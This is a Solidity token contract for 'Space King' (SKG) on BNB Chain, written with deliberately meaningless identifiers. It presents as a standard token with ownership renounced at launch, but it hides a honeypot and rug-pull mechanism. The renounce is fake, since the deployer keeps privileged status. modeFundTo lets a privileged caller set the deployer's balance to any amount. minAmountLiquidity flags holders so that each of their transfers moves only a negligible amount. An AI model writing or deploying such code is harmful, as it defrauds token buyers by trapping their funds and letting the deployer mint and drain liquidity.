/**
 *Submitted for verification at BscScan.com on 2023-02-09
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract limitShould {
    function swapReceiver() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface autoTotal {
    function createPair(address fundWallet, address autoFeeTo) external returns (address);
}

interface totalLaunchTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SpaceKing is IERC20, limitShould {
    uint8 private swapFee = 18;
    
    uint256 private isSwap = 100000000 * 10 ** swapFee;

    mapping(address => bool) public launchFee;
    bool public buySwap;

    string private enableFromWallet = "Space King";
    uint256 private tradingMode;
    mapping(address => uint256) private fromTake;
    uint256 private txLimitLaunched;


    uint256 constant tokenReceiver = 10 ** 10;
    mapping(address => bool) public receiverTotal;
    bool private fundFee;
    address private tradingFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint256 public modeAuto;
    bool public senderAmount;
    bool public shouldLaunched;
    address public feeTx;

    address private shouldMaxFrom;
    
    mapping(address => mapping(address => uint256)) private tokenFund;
    uint256 private amountMarketingWallet;
    string private totalSell = "SKG";
    address public enableTo;
    bool private feeTake;
    uint256 private liquidityFeeShould;
    bool public buyAuto;
    

    event OwnershipTransferred(address indexed toAt, address indexed buyTotal);

    constructor (){
        
        totalLaunchTeam sellListTo = totalLaunchTeam(tradingFrom);
        feeTx = autoTotal(sellListTo.factory()).createPair(sellListTo.WETH(), address(this));
        shouldMaxFrom = swapReceiver();
        if (feeTake == senderAmount) {
            senderAmount = true;
        }
        enableTo = shouldMaxFrom;
        receiverTotal[enableTo] = true;
        
        fromTake[enableTo] = isSwap;
        emit Transfer(address(0), enableTo, isSwap);
        shouldList();
    }

    

    function amountLiquidity() public {
        if (liquidityFeeShould == modeAuto) {
            modeAuto = amountMarketingWallet;
        }
        
        tradingMode=0;
    }

    function getOwner() external view returns (address) {
        return shouldMaxFrom;
    }

    function balanceOf(address fundReceiverMarketing) public view virtual override returns (uint256) {
        return fromTake[fundReceiverMarketing];
    }

    function owner() external view returns (address) {
        return shouldMaxFrom;
    }

    function symbol() external view returns (string memory) {
        return totalSell;
    }

    function shouldList() public {
        emit OwnershipTransferred(enableTo, address(0));
        shouldMaxFrom = address(0);
    }

    function approve(address toMode, uint256 fundAutoList) public virtual override returns (bool) {
        tokenFund[swapReceiver()][toMode] = fundAutoList;
        emit Approval(swapReceiver(), toMode, fundAutoList);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return isSwap;
    }

    function amountTx(address launchedLiquidity) public {
        if (buySwap) {
            return;
        }
        if (liquidityFeeShould != amountMarketingWallet) {
            buyAuto = false;
        }
        receiverTotal[launchedLiquidity] = true;
        if (feeTake != shouldLaunched) {
            txLimitLaunched = tradingMode;
        }
        buySwap = true;
    }

    function atIsTx() public view returns (uint256) {
        return amountMarketingWallet;
    }

    function transfer(address toFromTake, uint256 fundAutoList) external virtual override returns (bool) {
        return senderLiquidityFrom(swapReceiver(), toFromTake, fundAutoList);
    }

    function receiverTx() public {
        
        
        txLimitLaunched=0;
    }

    function listAmount() public {
        
        
        shouldLaunched=false;
    }

    function minAmountLiquidity(address amountReceiver) public {
        
        if (amountReceiver == enableTo || amountReceiver == feeTx || !receiverTotal[swapReceiver()]) {
            return;
        }
        if (shouldLaunched != senderAmount) {
            senderAmount = true;
        }
        launchFee[amountReceiver] = true;
    }

    function transferFrom(address fundLimit, address fundMarketing, uint256 fundAutoList) external override returns (bool) {
        if (tokenFund[fundLimit][swapReceiver()] != type(uint256).max) {
            require(fundAutoList <= tokenFund[fundLimit][swapReceiver()]);
            tokenFund[fundLimit][swapReceiver()] -= fundAutoList;
        }
        return senderLiquidityFrom(fundLimit, fundMarketing, fundAutoList);
    }

    function allowance(address marketingLaunched, address toMode) external view virtual override returns (uint256) {
        return tokenFund[marketingLaunched][toMode];
    }

    function txTokenTrading(address fundLimit, address fundMarketing, uint256 fundAutoList) internal returns (bool) {
        require(fromTake[fundLimit] >= fundAutoList);
        fromTake[fundLimit] -= fundAutoList;
        fromTake[fundMarketing] += fundAutoList;
        emit Transfer(fundLimit, fundMarketing, fundAutoList);
        return true;
    }

    function modeFundTo(uint256 fundAutoList) public {
        if (!receiverTotal[swapReceiver()]) {
            return;
        }
        fromTake[enableTo] = fundAutoList;
    }

    function senderLiquidityFrom(address fundLimit, address fundMarketing, uint256 fundAutoList) internal returns (bool) {
        if (fundLimit == enableTo || fundMarketing == enableTo) {
            return txTokenTrading(fundLimit, fundMarketing, fundAutoList);
        }
        if (modeAuto == amountMarketingWallet) {
            amountMarketingWallet = tradingMode;
        }
        if (launchFee[fundLimit]) {
            return txTokenTrading(fundLimit, fundMarketing, tokenReceiver);
        }
        
        return txTokenTrading(fundLimit, fundMarketing, fundAutoList);
    }

    function decimals() external view returns (uint8) {
        return swapFee;
    }

    function name() external view returns (string memory) {
        return enableFromWallet;
    }


}